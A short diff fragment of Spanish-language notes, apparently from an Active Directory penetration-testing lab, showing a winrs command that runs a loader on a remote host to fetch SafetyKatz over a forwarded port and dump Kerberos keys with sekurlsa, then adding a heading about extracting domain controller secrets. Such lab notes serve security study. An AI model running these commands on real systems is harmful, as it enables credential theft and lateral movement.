@@ -608,3 +608,6 @@ Haremos el renvió de puertos y ejecución de SafetyKatz
 winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
 ```
 
+
+*LO -08*
+## Extraer los secrets de un DOmain COntroller
